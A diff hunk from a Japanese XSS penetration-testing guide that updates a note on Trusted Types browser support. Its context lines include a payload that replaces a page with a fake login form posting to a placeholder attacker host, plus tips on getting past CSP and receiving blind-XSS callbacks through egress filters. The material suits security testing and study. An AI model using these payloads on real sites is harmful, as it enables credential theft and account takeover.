@@ -309,7 +309,7 @@ document.body.innerHTML='<form action="http://[ATTACKER_HOST]/capture">Username:
 
 - **HTTPOnly Cookie が設定されていると `document.cookie` では取得できない**：セッショントークン窃取の代わりに DOM 操作・フィッシングリダイレクト・CSRF を狙う
 - **CSP（Content Security Policy）が有効な場合**：`script-src` の制限で外部スクリプト読み込みが防がれる。CSP ヘッダーの `unsafe-inline` が許可されているかどうかを先に確認する。`nonce-...` / `strict-dynamic` 構成では既存スクリプトの後段から JS を実行する gadget（`<script nonce="...">` の中身を XSS 経由で書き換える経路）が必要
-- **Trusted Types（Chrome / Edge / Firefox 137+）**：`Content-Security-Policy: require-trusted-types-for 'script'` ヘッダがあると、`element.innerHTML = userInput` / `eval(userInput)` 等の DOM XSS sink が **TypeError で実行ブロックされる**（ポリシーで wrap されていない文字列を sink が拒否）。Trusted Types policy が定義されていれば policy 関数を経由した値しか sink に渡せないため、DOM XSS の通常ペイロードは弾かれる。**Trusted Types は HTML / 反射型 / 格納型 XSS には効かない**（サーバ側 HTML 出力に対しては効かない）。CSP report-only モードで配信中の場合は実害は出ないが将来ブロック化される予兆として記録
+- **Trusted Types（Chrome / Edge 系で先行実装、Firefox は 145 (2025-11) で early beta 有効化、148 で広く利用可・Safari 系は本稿時点で未対応）**：`Content-Security-Policy: require-trusted-types-for 'script'` ヘッダがあると、`element.innerHTML = userInput` / `eval(userInput)` 等の DOM XSS sink が **TypeError で実行ブロックされる**（ポリシーで wrap されていない文字列を sink が拒否）。Trusted Types policy が定義されていれば policy 関数を経由した値しか sink に渡せないため、DOM XSS の通常ペイロードは弾かれる。**Trusted Types は HTML / 反射型 / 格納型 XSS には効かない**（サーバ側 HTML 出力に対しては効かない）。CSP report-only モードで配信中の場合は実害は出ないが将来ブロック化される予兆として記録
 - **格納型 XSS は影響範囲が広い**：脆弱なフィールドに保存されたペイロードはそのページを閲覧した全ユーザーに影響する。管理者が閲覧するページに格納できれば高権限への昇格につながる
 - **バイパスは単一手法では不十分なことが多い**：エンコーディング・イベントハンドラ・タグ種類を組み合わせて試す
 - **Blind XSS は callback が来るまで時間がかかる**：管理者の閲覧タイミング依存。複数ペイロードを送る前に十分待つ（数分〜数十分）。受信用ポートは 80/443 に寄せると Egress を通りやすい
